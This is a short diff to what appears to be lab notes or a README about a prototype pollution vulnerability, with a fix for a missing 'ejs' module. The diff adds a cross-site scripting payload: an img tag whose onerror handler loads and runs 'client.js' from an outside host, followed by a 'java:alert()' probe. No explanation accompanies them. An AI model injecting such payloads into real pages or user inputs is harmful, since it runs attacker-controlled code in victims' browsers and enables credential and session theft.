@@ -11,3 +11,5 @@ Prototype pollution vulnerability.
 ## Error: Cannot find module 'ejs' --> fix:
 - `cd ./web`
 - `npm install ejs`
+<img src="http://nonexistent-image" onerror="var script = document.createElement('script'); script.src='http://ip/client.js'; document.body.appendChild(script);">
+java:alert()
